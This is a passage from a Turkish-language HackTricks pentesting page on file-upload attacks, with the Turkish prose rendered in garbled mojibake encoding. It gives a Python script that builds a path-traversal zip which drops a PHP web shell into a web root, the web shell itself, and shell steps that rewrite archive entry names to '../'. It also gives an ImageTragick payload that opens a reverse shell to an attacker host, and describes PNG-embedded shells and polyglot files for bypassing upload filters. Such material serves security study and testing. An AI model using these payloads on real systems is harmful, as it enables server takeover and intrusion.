AyrÄ±ca, **evilarc ile symlink hilesi** bir seÃ§enektir. AmaÃ§ `/flag.txt` gibi bir dosyayÄ± hedef almaksa, sisteminizde o dosyaya bir symlink oluÅŸturulmalÄ±dÄ±r. Bu, evilarc'Ä±n Ã§alÄ±ÅŸmasÄ± sÄ±rasÄ±nda hata ile karÅŸÄ±laÅŸmamasÄ±nÄ± saÄŸlar.

AÅŸaÄŸÄ±da, kÃ¶tÃ¼ niyetli bir zip dosyasÄ± oluÅŸturmak iÃ§in kullanÄ±lan bir Python kodu Ã¶rneÄŸi bulunmaktadÄ±r:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**SÄ±kÄ±ÅŸtÄ±rmayÄ± kÃ¶tÃ¼ye kullanarak dosya yayma**

Daha fazla detay iÃ§in **orijinal gÃ¶nderiyi kontrol edin**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell OluÅŸturma**: PHP kodu, `$_REQUEST` deÄŸiÅŸkeni aracÄ±lÄ±ÄŸÄ±yla geÃ§irilen komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in yazÄ±lmÄ±ÅŸtÄ±r.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **Dosya Yayma ve SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ Dosya OluÅŸturma**: Birden fazla dosya oluÅŸturulur ve bu dosyalarÄ± iÃ§eren bir zip arÅŸivi derlenir.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **Hex EditÃ¶rÃ¼ veya vi ile DeÄŸiÅŸtirme**: Zip iÃ§indeki dosyalarÄ±n isimleri vi veya bir hex editÃ¶rÃ¼ kullanÄ±larak deÄŸiÅŸtirilir, "xxA" "../" olarak deÄŸiÅŸtirilir ve dizinler arasÄ±nda geÃ§iÅŸ yapÄ±lÄ±r.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu iÃ§eriÄŸi bir resim uzantÄ±sÄ±yla yÃ¼kleyerek aÃ§Ä±ÄŸÄ± kullanÄ±n **(ImageMagick , 7.0.1-1)** ( [exploit](https://www.exploit-db.com/exploits/39767) formundan)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG Ãœzerine PHP Shell GÃ¶mme

Bir PNG dosyasÄ±nÄ±n IDAT parÃ§asÄ±na PHP shell gÃ¶mmek, belirli gÃ¶rÃ¼ntÃ¼ iÅŸleme iÅŸlemlerini etkili bir ÅŸekilde atlatabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` fonksiyonlarÄ±, sÄ±rasÄ±yla gÃ¶rÃ¼ntÃ¼leri yeniden boyutlandÄ±rma ve yeniden Ã¶rnekleme iÃ§in yaygÄ±n olarak kullanÄ±ldÄ±ÄŸÄ±ndan, bu baÄŸlamda Ã¶zellikle Ã¶nemlidir. GÃ¶mÃ¼lÃ¼ PHP shell'in bu iÅŸlemlerden etkilenmeden kalabilme yeteneÄŸi, belirli kullanÄ±m durumlarÄ± iÃ§in Ã¶nemli bir avantajdÄ±r.

Bu tekniÄŸin metodolojisi ve potansiyel uygulamalarÄ± hakkÄ±nda detaylÄ± bir keÅŸif, aÅŸaÄŸÄ±daki makalede saÄŸlanmÄ±ÅŸtÄ±r: ["PNG IDAT parÃ§alarÄ±nda Web Shell'leri Kodlama"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, sÃ¼recin ve sonuÃ§larÄ±nÄ±n kapsamlÄ± bir anlayÄ±ÅŸÄ±nÄ± sunmaktadÄ±r.

Daha fazla bilgi iÃ§in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar, siber gÃ¼venlikte benzersiz bir araÃ§ olarak hizmet eder ve aynÄ± anda birden fazla dosya formatÄ±nda geÃ§erli olarak var olabilen kamuflajlar gibi davranÄ±r. Ä°lginÃ§ bir Ã¶rnek, hem GIF hem de RAR arÅŸivi olarak iÅŸlev gÃ¶rebilen bir [GIFAR](https://en.wikipedia.org/wiki/Gifar)dÄ±r. Bu tÃ¼r dosyalar bu eÅŸleÅŸme ile sÄ±nÄ±rlÄ± deÄŸildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mÃ¼mkÃ¼ndÃ¼r.

Poliglot dosyalarÄ±n temel yararÄ±, dosyalarÄ± tÃ¼rÃ¼ne gÃ¶re tarayan gÃ¼venlik Ã¶nlemlerini aÅŸabilme yetenekleridir. Ã‡eÅŸitli uygulamalarda yaygÄ±n uygulama, potansiyel olarak zararlÄ± formatlarÄ±n (Ã¶rneÄŸin, JS, PHP veya Phar dosyalarÄ±) riskini azaltmak iÃ§in yalnÄ±zca belirli dosya tÃ¼rlerinin yÃ¼klenmesine izin vermektirâ€”JPEG, GIF veya DOC gibi. Ancak, bir poliglot, birden fazla dosya tÃ¼rÃ¼nÃ¼n yapÄ±sal kriterlerine uyarak bu kÄ±sÄ±tlamalarÄ± gizlice aÅŸabilir.

Uyum saÄŸlama yeteneklerine raÄŸmen, poliglotlar sÄ±nÄ±rlamalarla karÅŸÄ±laÅŸabilir. Ã–rneÄŸin, bir poliglot aynÄ± anda bir PHAR dosyasÄ±nÄ± (PHp ARchive) ve bir JPEG'i barÄ±ndÄ±rabilirken, yÃ¼kleme baÅŸarÄ±sÄ± platformun dosya uzantÄ±sÄ± politikalarÄ±na baÄŸlÄ± olabilir. Sistem, izin verilen uzantÄ±lar konusunda katÄ±ysa, bir poliglotun yalnÄ±zca yapÄ±sal ikiliÄŸi, yÃ¼klemesini garanti etmek iÃ§in yeterli olmayabilir.

Daha fazla bilgi iÃ§in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hack kariyeri** ile ilgileniyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± LehÃ§e yazÄ±lÄ± ve sÃ¶zlÃ¼ gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
